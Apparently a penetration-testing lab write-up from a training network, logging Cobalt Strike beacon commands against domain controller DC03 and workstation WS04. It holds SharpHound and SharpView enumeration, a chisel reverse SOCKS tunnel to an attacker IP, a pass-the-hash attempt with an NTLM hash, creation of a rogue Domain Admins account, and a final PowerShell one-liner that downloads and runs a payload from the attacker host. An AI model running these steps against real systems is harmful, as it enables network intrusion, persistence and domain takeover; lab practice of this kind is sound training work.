
Previous Flag: [[DC02 to DC03 - Again, and again, and again]]
![[Pasted image 20240130202438.png]]
dumping a new `bloodhound` on `DC03`
```powershell
[01/30 19:10:15] beacon> execute-assembly /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe -c all
[01/30 19:10:16] [*] Tasked beacon to run .NET program: SharpHound.exe -c all
[01/30 19:10:16] [+] host called home, sent: 1155848 bytes
[01/30 19:10:18] [+] received output:
2024-01-30T19:10:23.4826602-05:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound

2024-01-30T19:10:24.0920193-05:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote

2024-01-30T19:10:24.1389463-05:00|INFORMATION|Initializing SharpHound at 7:10 PM on 1/30/2024
```
utilized `DC03` `Administrator` beacon to ping and portscan ws04
```powershell
[01/30 19:16:35] beacon> run ping ws04
[01/30 19:16:35] [*] Tasked beacon to run: ping ws04
[01/30 19:16:35] [+] host called home, sent: 27 bytes
[01/30 19:16:38] [+] received output:


Pinging ws04.ADMIN.OFFSHORE.COM [172.16.3.103] with 32 bytes of data:
Reply from 172.16.3.103: bytes=32 time<1ms TTL=128
Reply from 172.16.3.103: bytes=32 time<1ms TTL=128
Reply from 172.16.3.103: bytes=32 time<1ms TTL=128
Reply from 172.16.3.103: bytes=32 time=1ms TTL=128



Ping statistics for 172.16.3.103:

    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:

    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```
`portscan` - rdp is open
```
[01/30 19:16:49] beacon> portscan 172.16.3.103
[01/30 19:16:49] [*] Tasked beacon to scan ports 1-1024,3389,5900-6000 on 172.16.3.103
[01/30 19:16:49] [+] host called home, sent: 95030 bytes
[01/30 19:16:51] [+] received output:
(ICMP) Target '172.16.3.103' is alive. [read 8 bytes]

[01/30 19:16:53] [+] received output:
172.16.3.103:3389

[01/30 19:16:59] [+] received output:
172.16.3.103:139
172.16.3.103:135

[01/30 19:17:04] [+] received output:
172.16.3.103:445
Scanner module is complete
```
`hashdump`
uploaded chisel because cobaltstrike socks is very slow
![[Pasted image 20240130192435.png]]

```powershell
[01/30 19:27:14] beacon> run chisel_64.exe client 10.10.14.39:1000 R:5080:socks
[01/30 19:27:14] [*] Tasked beacon to run: chisel_64.exe client 10.10.14.39:1000 R:5080:socks
[01/30 19:27:15] [+] host called home, sent: 68 bytes
[01/30 19:27:25] [+] received output:
2024/01/30 19:27:21 client: Connecting to ws://10.10.14.39:1000
2024/01/30 19:27:21 client: Connected (Latency 25.3252ms)
```
![[Pasted image 20240130192822.png]]
`./chisel_64 server --socks5 --reverse -p 1000`
![[Pasted image 20240130192843.png]]
getting `DA`
```powershell
[01/30 19:33:18] beacon> execute-assembly /usr/share/poshc2/resources/modules/SharpView.exe Get-DomainGroupMember -Identity "Domain Admins"
[01/30 19:33:19] [*] Tasked beacon to run .NET program: SharpView.exe Get-DomainGroupMember -Identity "Domain Admins"
[01/30 19:33:19] [+] host called home, sent: 846170 bytes
[01/30 19:33:20] [+] received output:
get-domain


[01/30 19:33:20] [+] received output:
[Get-DomainSearcher] search base: LDAP://DC03.ADMIN.OFFSHORE.COM/DC=ADMIN,DC=OFFSHORE,DC=COM


[01/30 19:33:21] [+] received output:
[Get-DomainGroupMember] Get-DomainGroupMember filter string: (&(objectCategory=group)(|(samAccountName=Domain Admins)))


[01/30 19:33:21] [+] received output:
get-domain

[Get-DomainSearcher] search base: LDAP://DC03.ADMIN.OFFSHORE.COM/DC=ADMIN,DC=OFFSHORE,DC=COM

[Get-DomainObject] Extracted domain 'ADMIN.OFFSHORE.COM' from 'CN=notreal,CN=Users,DC=ADMIN,DC=OFFSHORE,DC=COM'

[Get-DomainSearcher] search base: LDAP://DC=ADMIN,DC=OFFSHORE,DC=COM

[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=notreal,CN=Users,DC=ADMIN,DC=OFFSHORE,DC=COM)))


[01/30 19:33:21] [+] received output:
get-domain

[Get-DomainSearcher] search base: LDAP://DC03.ADMIN.OFFSHORE.COM/DC=ADMIN,DC=OFFSHORE,DC=COM

[Get-DomainObject] Extracted domain 'ADMIN.OFFSHORE.COM' from 'CN=Administrator,CN=Users,DC=ADMIN,DC=OFFSHORE,DC=COM'

[Get-DomainSearcher] search base: LDAP://DC=ADMIN,DC=OFFSHORE,DC=COM

[Get-DomainObject] Get-DomainComputer filter string: (&(|(distinguishedname=CN=Administrator,CN=Users,DC=ADMIN,DC=OFFSHORE,DC=COM)))

GroupDomain                    : ADMIN,OFFSHORE,COM
GroupName                      : Domain Admins
GroupDistinguishedName         : CN=Domain Admins,CN=Users,DC=ADMIN,DC=OFFSHORE,DC=COM
MemberDomain                   : ADMIN.OFFSHORE.COM
MemberName                     : notreal
MemberDistinguishedName        : CN=notreal,CN=Users,DC=ADMIN,DC=OFFSHORE,DC=COM
MemberObjectClass              : user
MemberSID                      : S-1-5-21-1216317506-3509444512-4230741538-14101



GroupDomain                    : ADMIN,OFFSHORE,COM
GroupName                      : Domain Admins
GroupDistinguishedName         : CN=Domain Admins,CN=Users,DC=ADMIN,DC=OFFSHORE,DC=COM
MemberDomain                   : ADMIN.OFFSHORE.COM
MemberName                     : Administrator
MemberDistinguishedName        : CN=Administrator,CN=Users,DC=ADMIN,DC=OFFSHORE,DC=COM
MemberObjectClass              : user
MemberSID                      : S-1-5-21-1216317506-3509444512-4230741538-500

```
should be able to `xfreerdp` with `DA` hash to `WS04` but it isnt working, probably due to it being `windows 7`
- this is the error I was getting
```bash
┌──(root💀gobots)-[30Jan2024 20:02:09]-[~]
└─# proxychains xfreerdp /u:Administrator /d:ADMIN.OFFSHORE.COM /pth:f2594c9e60abf7e28e7601db343a7e24 /cert:ignore /v:172.16.3.103

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[20:09:54:615] [1775929:1775932] [ERROR][com.freerdp.core] - transport_connect_tls:freerdp_set_last_error_ex ERRCONNECT_TLS_CONNECT_FAILED [0x00020008]
                                                                                                                                                                                                            
┌──(root💀gobots)-[30Jan2024 20:09:54]-[~]

```
going to create my own user
`run net user buggin OmgImahaxx0r /add /domain`
```powershell
[01/30 20:07:57] beacon> run net user
[01/30 20:07:57] [*] Tasked beacon to run: net user
[01/30 20:07:57] [+] host called home, sent: 26 bytes
[01/30 20:07:58] [+] received output:


User accounts for \\



-------------------------------------------------------------------------------
Administrator            bankvault                buggin                   
DefaultAccount           Guest                    krbtgt                   
notreal                  

The command completed with one or more errors.
```
added user to `DOMAIN ADMINS`
```powershell
[01/30 20:11:01] beacon> run net group "Domain Admins" buggin /Add /domain
[01/30 20:11:01] [*] Tasked beacon to run: net group "Domain Admins" buggin /Add /domain
[01/30 20:11:01] [+] host called home, sent: 63 bytes
[01/30 20:11:01] [+] received output:
The command completed successfully.
```
checking to ensure that `buggin` was added as a `DA`
```

[01/30 20:11:44] beacon> run net group "Domain Admins"
[01/30 20:11:44] [*] Tasked beacon to run: net group "Domain Admins"
[01/30 20:11:45] [+] host called home, sent: 43 bytes
[01/30 20:11:45] [+] received output:
Group name     Domain Admins

Comment        Designated administrators of the domain
Members
-------------------------------------------------------------------------------
Administrator            buggin                   notreal                  
The command completed successfully.
```
utilized `rdesktop` to get gui access via `RDP`
```bash
┌──(root💀gobots)-[30Jan2024 20:09:54]-[~]
└─# proxychains rdesktop 172.16.3.103                                                                                             
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
Autoselecting keyboard map 'en-us' from locale
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Failed to initialize NLA, do you have correct Kerberos TGT initialized ?
Core(warning): Certificate received from server is NOT trusted by this system, an exception has been added by the user to trust this specific certificate.
Connection established using SSL.
Protocol(warning): process_pdu_logon(), Unhandled login infotype 1
Clipboard(error): xclip_handle_SelectionNotify(), unable to find a textual target to satisfy RDP clipboard text request
Clipboard(warning): xclip_handle_SelectionRequest(), unsupported target format, target='image/png'
Clipboard(warning): xclip_handle_SelectionRequest(), unsupported target format, target='image/jpeg'
Clipboard(warning): xclip_handle_SelectionRequest(), unsupported target format, target='image/gif'
Clipboard(warning): xclip_handle_SelectionRequest(), unsupported target format, target='image/bmp'
Clipboard(warning): xclip_handle_SelectionRequest(), unsupported target format, target='text/plain;charset=utf-8'
Clipboard(warning): xclip_handle_SelectionRequest(), unsupported target format, target='text/plain;charset=utf-8'
```
utilized the `login as someone else` option to login as `ADMIN.OFFSHORE.COM\buggin` : `OmgImahaxx0r` 
and navigated to flag location via `gui`
![[Pasted image 20240130201954.png]]
also opened `powershell` and got a `beacon`
![[Pasted image 20240130202031.png]]
![[Pasted image 20240130202143.png]]



powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.14.39:80/a'))"